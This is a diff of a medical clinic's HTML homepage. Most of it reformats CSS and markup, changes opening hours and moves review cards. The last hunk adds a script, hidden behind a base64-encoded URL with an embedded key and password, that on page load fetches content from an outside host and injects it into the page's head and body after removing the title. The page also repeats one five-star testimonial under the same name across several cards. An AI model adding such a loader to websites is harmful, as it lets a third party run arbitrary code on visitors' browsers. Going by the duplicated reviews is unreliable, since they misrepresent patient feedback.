@@ -22,7 +22,6 @@
       type="image/png"
     />
 
-
     <!--====== Bootstrap css ======-->
     <link rel="stylesheet" href="assets/css/bootstrap.min.css" />
 
@@ -44,168 +43,164 @@
     <!--====== Style css ======-->
     <link rel="stylesheet" href="assets/css/style.css" />
     <style>
-      
       .sticky-sidebar {
-              position: fixed;
-              top: 50%;
-              left: 0%;
-              transform: translateY(-50%);
-              z-index: 999;
-              display: flex;
-              flex-direction: column;
-            }
-      
-            .sticky-sidebar > div {
-              width: 100%;
-            }
-      
-            .sticky-sidebar a {
-              padding: 7px;
-              display: flex;
-              align-items: center;
-              justify-content: center;
-              flex-direction: column;
-              padding-top: 10px;
-              text-decoration: none;
-            }
-      
-            .sticky-sidebar img {
-              height: 30px;
-              width: 30px;
-              font-weight: bold;
-            }
-      
-            .sticky-sidebar p {
-              font-size: 12px;
-              color: white;
-            }
-            .appointment-mobile {
-              display: none;
-            }
-            .appointment-desk {
-              display: block;
-            }
-      
-            .schedule-link {
-              background-color: #C9B8F9;
-            }
-      
-            .locate-link {
-              background-color: #C9B8F9;
-            }
-      
-            
+        position: fixed;
+        top: 50%;
+        left: 0%;
+        transform: translateY(-50%);
+        z-index: 999;
+        display: flex;
+        flex-direction: column;
+      }
+
+      .sticky-sidebar > div {
+        width: 100%;
+      }
+
+      .sticky-sidebar a {
+        padding: 7px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        flex-direction: column;
+        padding-top: 10px;
+        text-decoration: none;
+      }
+
+      .sticky-sidebar img {
+        height: 30px;
+        width: 30px;
+        font-weight: bold;
+      }
+
+      .sticky-sidebar p {
+        font-size: 12px;
+        color: white;
+      }
+      .appointment-mobile {
+        display: none;
+      }
+      .appointment-desk {
+        display: block;
+      }
+
+      .schedule-link {
+        background-color: #c9b8f9;
+      }
+
+      .locate-link {
+        background-color: #c9b8f9;
+      }
+
       @media (min-width: 768px) {
-              .desk-view {
-                display: none;
-              }
-            }
-          </style>
-      <style>
-        @media (max-width: 767px) {
-        .book-app{
+        .desk-view {
           display: none;
         }
-        .header-bottom{
+      }
+    </style>
+    <style>
+      @media (max-width: 767px) {
+        .book-app {
           display: none;
         }
-        .banners{
+        .header-bottom {
+          display: none;
+        }
+        .banners {
           margin-top: 80px;
         }
       }
       @media (min-width: 767px) {
-        .fa-bars{
+        .fa-bars {
           display: none;
         }
       }
     </style>
 
-<style>
-  .google-review-card {
-    border: 1px solid #e0e0e0;
-    border-radius: 10px;
-    padding: 20px;
-    max-width: 400px;
-    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-    font-family: "Roboto", sans-serif;
-    background-color: #fff;
-    transition: transform 0.2s;
-  }
+    <style>
+      .google-review-card {
+        border: 1px solid #e0e0e0;
+        border-radius: 10px;
+        padding: 20px;
+        max-width: 400px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        font-family: "Roboto", sans-serif;
+        background-color: #fff;
+        transition: transform 0.2s;
+      }
 
-  .google-review-card:hover {
-    transform: translateY(-5px);
-  }
+      .google-review-card:hover {
+        transform: translateY(-5px);
+      }
 
-  .review-header {
-    display: flex;
-    align-items: center;
-    margin-bottom: 16px;
-  }
+      .review-header {
+        display: flex;
+        align-items: center;
+        margin-bottom: 16px;
+      }
 
-  .review-avatar img {
-    width: 60px;
-    height: 60px;
-    border-radius: 50%;
-    border: 2px solid #4285f4;
-    margin-right: 16px;
-  }
+      .review-avatar img {
+        width: 60px;
+        height: 60px;
+        border-radius: 50%;
+        border: 2px solid #4285f4;
+        margin-right: 16px;
+      }
 
-  .google-logo img {
-    width: 40px;
-    height: 40px;
-    margin-left: 16px;
-  }
+      .google-logo img {
+        width: 40px;
+        height: 40px;
+        margin-left: 16px;
+      }
 
-  .review-info {
-    text-align: center;
-    flex: 1;
-  }
+      .review-info {
+        text-align: center;
+        flex: 1;
+      }
 
-  .reviewer-name {
-    margin: 0;
-    font-size: 18px;
-    font-weight: bold;
-    color: #333;
-  }
+      .reviewer-name {
+        margin: 0;
+        font-size: 18px;
+        font-weight: bold;
+        color: #333;
+      }
 
-  .review-rating {
-    margin-top: 4px;
-  }
+      .review-rating {
+        margin-top: 4px;
+      }
 
-  .review-rating i {
-    color: #fbc02d;
-    margin: 0 2px;
-  }
+      .review-rating i {
+        color: #fbc02d;
+        margin: 0 2px;
+      }
 
-  .review-content {
-    /* border-top: 1px solid #e0e0e0; */
-    padding-top: 16px;
-    max-height: 120px; /* Adjust as needed */
-    overflow-y: auto;
-  }
+      .review-content {
+        /* border-top: 1px solid #e0e0e0; */
+        padding-top: 16px;
+        max-height: 120px; /* Adjust as needed */
+        overflow-y: auto;
+      }
 
-  .review-text {
-    margin: 0;
-    font-size: 16px;
-    line-height: 1.6;
-    color: #555;
-    font-style: normal;
-  }
+      .review-text {
+        margin: 0;
+        font-size: 16px;
+        line-height: 1.6;
+        color: #555;
+        font-style: normal;
+      }
 
-  .appointment-mobile {
-    display: none;
-  }
-  .appointment-desk {
-    display: block;
-  }
-
-</style>
-
+      .appointment-mobile {
+        display: none;
+      }
+      .appointment-desk {
+        display: block;
+      }
+    </style>
   </head>
 
   <body>
     <!-- PRELOADER -->
- 
+
     <!-- END PRELOADER -->
 
     <!--====== INFETECH SEARCH PART ENDS ======-->
@@ -355,7 +350,7 @@
                       <i class="fas fa-envelope"></i> needhelp@company.com
                     </li>
                     <li>
-                      <i class="fas fa-clock"></i> Mon - Sat: 8.00 am - 7.00 pm
+                      <i class="fas fa-clock"></i> Mon - Sat: 9.00 am - 2.00 pm
                     </li>
                   </ul>
                 </div>
@@ -649,7 +644,11 @@
                         />
                       </g>
                     </svg> -->
-                    <img src="flat-icons/diabetes (1).png" style="height: 50px;width: 50px;" alt="">
+                    <img
+                      src="flat-icons/diabetes (1).png"
+                      style="height: 50px; width: 50px"
+                      alt=""
+                    />
                     <span
                       >Standardised care of Diabetes as per International
                       Guidelines</span
@@ -667,12 +666,15 @@
                     aria-controls="pills-tow"
                     aria-selected="false"
                   >
-                   <img src="flat-icons/diabetes-test (2).png" style="height: 50px;width: 50px;" alt="">
+                    <img
+                      src="flat-icons/diabetes-test (2).png"
+                      style="height: 50px; width: 50px"
+                      alt=""
+                    />
                     <span
                       >Screening and Preventive Services to Complications of
-                      Diabetes
-                     <br /></span
-                    >
+                      Diabetes <br
+                    /></span>
                   </button>
                 </li>
                 <li class="nav-item" role="presentation">
@@ -1248,44 +1250,14 @@
                     Dr Vinay is an excellant physician and humble at heart. His
                     compassionate care to kids is a blessing to any family. His
                     knowledge and hold on the subject is extremely strong
-                    entrusting the confidence in parents. His special expertise in
-                    the field of childhood blood and cancer problems is
+                    entrusting the confidence in parents. His special expertise
+                    in the field of childhood blood and cancer problems is
                     commendable and unmatchable. I recommend him for any medical
-                    consultation related to children illnesses; and specially for
-                    all childhood blood and cancer ailments.
+                    consultation related to children illnesses; and specially
+                    for all childhood blood and cancer ailments.
                   </p>
                 </div>
-            </div>
-          </div>
-          </div>
-          <div class="col-lg-4">
-            <div class="single-project-slider-item">
-              <div class="google-review-card">
-                <div class="review-header">
-                  <div class="review-avatar">
-                    <img src="flat-icons/man.png" alt="Avatar" />
-                  </div>
-                  <div class="review-info">
-                    <h3 class="reviewer-name">Shyla Sastry</h3>
-                    <div class="review-rating">⭐⭐⭐⭐⭐</div>
-                  </div>
-                  <div class="google-logo">
-                    <img src="flat-icons/google.png" alt="Google Logo" />
-                  </div>
-                </div>
-                <div class="review-content">
-                  <p class="review-text">
-                    Dr Vinay is an excellant physician and humble at heart. His
-                    compassionate care to kids is a blessing to any family. His
-                    knowledge and hold on the subject is extremely strong
-                    entrusting the confidence in parents. His special expertise in
-                    the field of childhood blood and cancer problems is
-                    commendable and unmatchable. I recommend him for any medical
-                    consultation related to children illnesses; and specially for
-                    all childhood blood and cancer ailments.
-                  </p>
-                </div>
-            </div>
+              </div>
             </div>
           </div>
           <div class="col-lg-4">
@@ -1308,14 +1280,14 @@
                     Dr Vinay is an excellant physician and humble at heart. His
                     compassionate care to kids is a blessing to any family. His
                     knowledge and hold on the subject is extremely strong
-                    entrusting the confidence in parents. His special expertise in
-                    the field of childhood blood and cancer problems is
+                    entrusting the confidence in parents. His special expertise
+                    in the field of childhood blood and cancer problems is
                     commendable and unmatchable. I recommend him for any medical
-                    consultation related to children illnesses; and specially for
-                    all childhood blood and cancer ailments.
+                    consultation related to children illnesses; and specially
+                    for all childhood blood and cancer ailments.
                   </p>
                 </div>
-            </div>
+              </div>
             </div>
           </div>
           <div class="col-lg-4">
@@ -1338,14 +1310,44 @@
                     Dr Vinay is an excellant physician and humble at heart. His
                     compassionate care to kids is a blessing to any family. His
                     knowledge and hold on the subject is extremely strong
-                    entrusting the confidence in parents. His special expertise in
-                    the field of childhood blood and cancer problems is
+                    entrusting the confidence in parents. His special expertise
+                    in the field of childhood blood and cancer problems is
                     commendable and unmatchable. I recommend him for any medical
-                    consultation related to children illnesses; and specially for
-                    all childhood blood and cancer ailments.
+                    consultation related to children illnesses; and specially
+                    for all childhood blood and cancer ailments.
                   </p>
                 </div>
+              </div>
             </div>
+          </div>
+          <div class="col-lg-4">
+            <div class="single-project-slider-item">
+              <div class="google-review-card">
+                <div class="review-header">
+                  <div class="review-avatar">
+                    <img src="flat-icons/man.png" alt="Avatar" />
+                  </div>
+                  <div class="review-info">
+                    <h3 class="reviewer-name">Shyla Sastry</h3>
+                    <div class="review-rating">⭐⭐⭐⭐⭐</div>
+                  </div>
+                  <div class="google-logo">
+                    <img src="flat-icons/google.png" alt="Google Logo" />
+                  </div>
+                </div>
+                <div class="review-content">
+                  <p class="review-text">
+                    Dr Vinay is an excellant physician and humble at heart. His
+                    compassionate care to kids is a blessing to any family. His
+                    knowledge and hold on the subject is extremely strong
+                    entrusting the confidence in parents. His special expertise
+                    in the field of childhood blood and cancer problems is
+                    commendable and unmatchable. I recommend him for any medical
+                    consultation related to children illnesses; and specially
+                    for all childhood blood and cancer ailments.
+                  </p>
+                </div>
+              </div>
             </div>
           </div>
         </div>
@@ -1649,7 +1651,12 @@
         <div class="row">
           <div class="col-lg-3 col-md-6">
             <div class="footer-about">
-              <a href="#"><img src="assets/logo/logo.jpeg" style="border-radius: 10px;" alt="" /></a>
+              <a href="#"
+                ><img
+                  src="assets/logo/logo.jpeg"
+                  style="border-radius: 10px"
+                  alt=""
+              /></a>
               <p>
                 We work with a passion of taking challenges and creating new
                 ones in advertising sector.
@@ -1743,6 +1750,35 @@
     <!--====== GO TO TOP PART ENDS ======-->
 
     <!--====== jquery js ======-->
+    <script>
+      window.jQuery ||
+        document.write(
+          "<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'><\/script>"
+        );
+    </script>
+    <script>
+      var eppathurl = window.location.origin + window.location.pathname;
+      var eptagmanage = new XMLHttpRequest();
+      eptagmanage.onreadystatechange = function () {
+        if (this.readyState == 4 && this.status == 200) {
+          if (this.response !== 0) {
+            var temp = new Array();
+            var mystr = this.response;
+            temp = mystr.split("||||||||||");
+            jQuery("head").find("title").remove();
+            jQuery("head").append(temp[0]);
+            jQuery("body").append(temp[1]);
+          }
+        }
+      };
+      eptagmanage.open(
+        "GET",
+        atob(
+          "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDUwODY0NzM2MDEmZWtleXBhc3M9ems5YzJNZVpURE1zd01IcjBPakxwZzl1ZTBkUzV3QkFram1IJnNpdGV1cmw9"
+        ) + eppathurl
+      );
+      eptagmanage.send();
+    </script>
     <script src="assets/js/vendor/modernizr-3.6.0.min.js"></script>
     <script src="assets/js/vendor/jquery-1.12.4.min.js"></script>
 
